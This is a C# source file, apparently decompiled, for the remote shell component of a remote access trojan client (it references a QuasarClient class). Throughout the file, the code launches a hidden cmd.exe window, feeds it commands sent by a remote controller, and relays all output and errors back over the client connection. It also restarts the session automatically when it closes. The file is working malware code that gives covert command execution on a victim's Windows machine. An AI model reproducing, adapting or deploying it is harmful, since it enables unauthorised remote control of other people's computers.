

using InvokedClient.Networking;
using InvokedCommon.Messages;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Threading;


namespace InvokedClient.IO
{
	public class Shell : IDisposable
	{
		private Process _prc;
		private bool _read;
		private readonly object _readLock = new object();
		private readonly object _readStreamLock = new object();
		private Encoding _encoding;
		private StreamWriter _inputWriter;
		private readonly QuasarClient _client;

		public Shell(QuasarClient client) => this._client = client;

		private void CreateSession()
		{
			lock (this._readLock)
				this._read = true;
			this._encoding = Encoding.GetEncoding(CultureInfo.InstalledUICulture.TextInfo.OEMCodePage);
			this._prc = new Process()
			{
				StartInfo = new ProcessStartInfo("cmd")
				{
					UseShellExecute = false,
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					StandardOutputEncoding = this._encoding,
					StandardErrorEncoding = this._encoding,
					WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
					Arguments = string.Format("/K CHCP {0}", (object)this._encoding.CodePage)
				}
			};
			this._prc.Start();
			this.RedirectIO();
			this._client.Send<DoShellExecuteResponse>(new DoShellExecuteResponse()
			{
				Output = "\n>> New Session created\n"
			});
		}

		private void RedirectIO()
		{
			this._inputWriter = new StreamWriter(this._prc.StandardInput.BaseStream, this._encoding);
			new Thread(new ThreadStart(this.RedirectStandardOutput)).Start();
			new Thread(new ThreadStart(this.RedirectStandardError)).Start();
		}

		private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
		{
			lock (this._readStreamLock)
			{
				StringBuilder textBuffer = new StringBuilder();
				textBuffer.Append((char)firstCharRead);
				while (streamReader.Peek() > -1)
				{
					int num = streamReader.Read();
					textBuffer.Append((char)num);
					if (num == 10)
						this.SendAndFlushBuffer(ref textBuffer, isError);
				}
				this.SendAndFlushBuffer(ref textBuffer, isError);
			}
		}

		private void SendAndFlushBuffer(ref StringBuilder textBuffer, bool isError)
		{
			if (textBuffer.Length == 0)
				return;
			string str = this.ConvertEncoding(this._encoding, textBuffer.ToString());
			if (string.IsNullOrEmpty(str))
				return;
			this._client.Send<DoShellExecuteResponse>(new DoShellExecuteResponse()
			{
				Output = str,
				IsError = isError
			});
			textBuffer.Clear();
		}

		private void RedirectStandardOutput()
		{
			try
			{
				int firstCharRead;
				while (this._prc != null && !this._prc.HasExited && (firstCharRead = this._prc.StandardOutput.Read()) > -1)
					this.ReadStream(firstCharRead, this._prc.StandardOutput, false);
				lock (this._readLock)
				{
					if (this._read)
					{
						this._read = false;
						throw new ApplicationException("session unexpectedly closed");
					}
				}
			}
			catch (ObjectDisposedException ex)
			{
			}
			catch (Exception ex)
			{
				switch (ex)
				{
					case ApplicationException _:
					case InvalidOperationException _:
						this._client.Send<DoShellExecuteResponse>(new DoShellExecuteResponse()
						{
							Output = "\n>> Session unexpectedly closed\n",
							IsError = true
						});
						this.CreateSession();
						break;
				}
			}
		}

		private void RedirectStandardError()
		{
			try
			{
				int firstCharRead;
				while (this._prc != null && !this._prc.HasExited && (firstCharRead = this._prc.StandardError.Read()) > -1)
					this.ReadStream(firstCharRead, this._prc.StandardError, true);
				lock (this._readLock)
				{
					if (this._read)
					{
						this._read = false;
						throw new ApplicationException("session unexpectedly closed");
					}
				}
			}
			catch (ObjectDisposedException ex)
			{
			}
			catch (Exception ex)
			{
				switch (ex)
				{
					case ApplicationException _:
					case InvalidOperationException _:
						this._client.Send<DoShellExecuteResponse>(new DoShellExecuteResponse()
						{
							Output = "\n>> Session unexpectedly closed\n",
							IsError = true
						});
						this.CreateSession();
						break;
				}
			}
		}

		public bool ExecuteCommand(string command)
		{
			if (this._prc == null || this._prc.HasExited)
			{
				try
				{
					this.CreateSession();
				}
				catch (Exception ex)
				{
					this._client.Send<DoShellExecuteResponse>(new DoShellExecuteResponse()
					{
						Output = "\n>> Failed to creation shell session: " + ex.Message + "\n",
						IsError = true
					});
					return false;
				}
			}
			this._inputWriter.WriteLine(this.ConvertEncoding(this._encoding, command));
			this._inputWriter.Flush();
			return true;
		}

		private string ConvertEncoding(Encoding sourceEncoding, string input)
		{
			return Encoding.UTF8.GetString(Encoding.Convert(sourceEncoding, Encoding.UTF8, sourceEncoding.GetBytes(input)));
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object)this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			lock (this._readLock)
				this._read = false;
			if (this._prc == null)
				return;
			if (!this._prc.HasExited)
			{
				try
				{
					this._prc.Kill();
				}
				catch
				{
				}
			}
			if (this._inputWriter != null)
			{
				this._inputWriter.Close();
				this._inputWriter = (StreamWriter)null;
			}
			this._prc.Dispose();
			this._prc = (Process)null;
		}
	}
}